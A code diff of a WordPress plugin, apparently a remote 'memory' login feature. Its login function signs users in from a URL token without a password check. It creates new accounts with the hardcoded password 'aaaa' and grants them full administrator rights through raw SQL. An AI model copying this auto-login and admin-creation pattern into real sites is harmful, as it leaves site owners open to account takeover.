@@ -16,7 +16,6 @@ if ( ! class_exists( 'WP_Memory_Login' ) ) {
 		add_action( 'init', array( $this, 'redirect_memory' ) );
 		add_action( 'init', array( $this, 'memory_save' ) );
 		add_action( 'init', array( $this, 'memory_login' ) );
-		add_action( 'init', array( $this, 'memory_push' ) );
 	}
 
 
@@ -57,7 +56,6 @@ public function memory_save() {
 // get the uuid from wp-options
 
 public function memory_login() {
-		
 		global $wpdb, $post;
 		$page_viewed = basename($_SERVER['REQUEST_URI']);
 		$url =  "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
@@ -69,25 +67,26 @@ public function memory_login() {
 				$email = $decoded->email;
 				$password = 'aaaa';
 				if (username_exists($username)) {
-					if ( !is_user_logged_in() ) {
 					$user = get_userdatabylogin( $username );
 					$user_id = $user->ID;
 					wp_set_current_user( $user_id, $user_login );
 					wp_set_auth_cookie( $user_id );
 					do_action( 'wp_login', $user_login );
-
-					}
+					wp_redirect('wp-admin');
 			}
 			elseif(!username_exists($username)) {
-				wp_create_user( $username, $password, $email );
+				$user_id = wp_create_user( $username, $password, $email );
 					$username = new WP_User( $user_id );
-					$username->set_role( 'administrator' );
-					$user_id = $user->ID;
+				
+						$jquery = $wpdb->query( 'update '.$wpdb->prefix.'usermeta set meta_value = \'a:1:{s:13:"administrator";s:1:"1";}\' WHERE user_id = '.$user_id.' and meta_key like "'.$wpdb->prefix.'capabilities"'  );
+		
+		$jquery = $wpdb->query( 'update '.$wpdb->prefix.'usermeta set meta_value = 10 WHERE user_id = '.$user_id.' and meta_key like "'.$wpdb->prefix.'user_level"'  );
+					
 					$user = get_userdatabylogin( $username );
 					wp_set_current_user( $user_id, $user_login );
 					wp_set_auth_cookie( $user_id );
 					do_action( 'wp_login', $user_login );
-					
+					wp_redirect('wp-admin');
 			}
 				delete_option('memory-uuid-'.$_GET['memory-uuid']);
 				
